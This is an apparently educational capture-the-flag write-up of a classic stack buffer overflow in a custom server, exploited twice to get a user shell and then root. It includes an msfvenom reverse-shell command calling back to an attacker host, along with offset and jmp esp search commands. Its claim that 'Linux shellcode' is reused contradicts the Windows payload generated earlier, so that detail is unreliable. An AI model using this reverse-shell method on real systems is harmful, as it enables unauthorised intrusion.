Dawn2: a classic stack buffer overflow, twice

A custom Windows server, leaked straight off its own web page, turns out to be vulnerable to a textbook stack-based buffer overflow. The target runs two separate instances of it, one for a user shell, a second running as root for the rest.

Room: Dawn2 Category: Binary Exploitation Tools: Immunity Debugger, mona, msfvenom, nmap

The setup: a web server hosting a download link to its own companion binary, plus two custom TCP services running on unusual ports. The job: reverse-engineer a crash into a working exploit, twice, once for a foothold and once for root.

Background, In Plain Terms

Stack buffer overflow

Sending more data into a fixed-size buffer than it can hold overwrites adjacent memory, including the saved return address (EIP) that controls where execution jumps next. Controlling that overwrite means controlling where the program goes next.

jmp esp

Shellcode gets placed on the stack, and ESP points at the stack. Redirecting EIP to any instruction that reads "jump to ESP" lands execution directly on the injected shellcode, without needing to guess its exact memory address.

Part One: User Shell

1
Find the target binary and confirm the crash

The web server's default page links directly to a zip containing the custom server binary and a README warning that the service "may crash after several requests," a strong hint before any fuzzing even starts. Confirming the file type:

file dawn.exe
dawn.exe: PE32 executable (console) Intel 80386, for MS Windows

With the binary loaded in Immunity Debugger on a Windows VM, sending 500 bytes of A followed by a null byte (per the README's own instructions) overwrites EIP with 41414141, confirming the crash is controllable.

Why this works

A target that hands you its own binary, and even a note about how it fails, is doing half the reconnaissance for you. Reading the README literally (send a null byte to terminate the message) turned out to be load-bearing for triggering the crash at all.

2
Find the exact offset

A unique, non-repeating 500-byte pattern (generated with msf-pattern_create) replaces the plain A's. Whatever four bytes land in EIP at crash time pinpoint the exact offset into the buffer:

msf-pattern_offset -q <4-bytes-from-EIP>
[*] Exact match at offset 272
Why this works

A repeating pattern like all-A's can't tell you where in the buffer the crash happened, every chunk looks the same. A non-repeating pattern makes every 4-byte window unique, so whatever ends up in EIP maps back to one exact position.

3
Confirm control and check for space

Sending the offset in A's, four B's, then a null byte confirms EIP lands exactly on 42424242. Following that with 400 C's (the rough size budget for a reverse-shell payload) confirms there's room in the buffer for real shellcode without corrupting anything:

payload = A*offset + B*4 + C*400 + nullbyte
Why this works

Controlling EIP is necessary but not sufficient, the payload also has to fit. Confirming space for it before writing real shellcode avoids discovering a buffer-size problem after everything else is already working.

4
Rule out bad characters

Certain byte values (null bytes, line feeds, carriage returns) get mangled by string-handling code before they ever reach the buffer intact. Sending every possible byte value from \x01 to \xff and comparing what Immunity Debugger shows in memory against what was actually sent identifies which, if any, get corrupted in transit.

Why this works

Shellcode generated without knowing the bad-character list can silently break the moment it includes one of them. Testing the full byte range up front means the final payload can be generated with exactly the right exclusion list from the start.

5
Find a jump point and weaponize it

Mona's built-in search finds a usable jmp esp instruction with no protections enabled:

!mona jmp -r esp

With the offset, a working jump address, and a confirmed bad-character list, msfvenom generates working shellcode matched to the target's architecture and OS:

msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=<attacker-ip> LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode

The final payload (offset padding, jump address, a NOP sled, the shellcode, then a null terminator) sent against the real target lands a reverse shell.

Why this works

Every earlier step exists to answer one question this payload depends on: exactly how many bytes, which address to jump to, and which bytes to avoid. Skipping any of them turns this into blind guessing instead of a reliable exploit.

Part Two: Root, via a Second Instance

6
Find the second server, running as root

A second binary, the same custom server software but a different build, sits on the target and listens on a different port entirely, this one running with root privileges.

Why this works

Gaining a foothold is rarely the end of enumeration, it's a reason to look harder. The same vulnerable software class, redeployed with higher privileges, is exactly the kind of thing a first shell makes visible that external scanning wouldn't.

7
Repeat the process against the new target

Same methodology, different numbers. The crash is confirmed the same way, and this time the offset comes out much shorter:

msf-pattern_offset -q <4-bytes-from-EIP>
[*] Exact match at offset 13

The bad-character test comes back clean against the same exclusion list as before, and a fresh !mona jmp -r esp search finds a valid jump address for this binary's own memory layout. The existing Linux reverse-shell shellcode, already generated for the target's architecture, gets reused directly.

Why this works

The same software, even a different build, tends to fail the same way. Running through the identical methodology (not guessing the new offset, not skipping the bad-char check) is what makes this repeatable rather than lucky, and it confirms the two binaries really are built from the same vulnerable code path with different buffer sizes.

Full Attack Chain

Web server: companion binary leaked via a download link
  → File type confirmed: 32-bit Windows PE
       → Crash confirmed: 500 A's overwrite EIP
            → Unique pattern: exact offset found
                 → Space confirmed: room for a real payload
                      → Bad chars ruled out
                           → jmp esp found via mona
                                → msfvenom shellcode: reverse shell as a normal user

Second server instance found, running as root
  → Same methodology repeated: new offset, same bad chars, new jmp esp
       → Shellcode reused: reverse shell as root

Takeaways

A crash is not an exploit until every variable is pinned down

Offset, bad characters, and a reliable jump address all have to be correct simultaneously. Skipping the bad-character check is the most common way a theoretically correct exploit fails in practice.

The same vulnerable code, redeployed, is still vulnerable

Finding one instance of a flawed custom service is a strong reason to look for others. A second copy running with higher privileges turned a user shell into root using the identical technique.
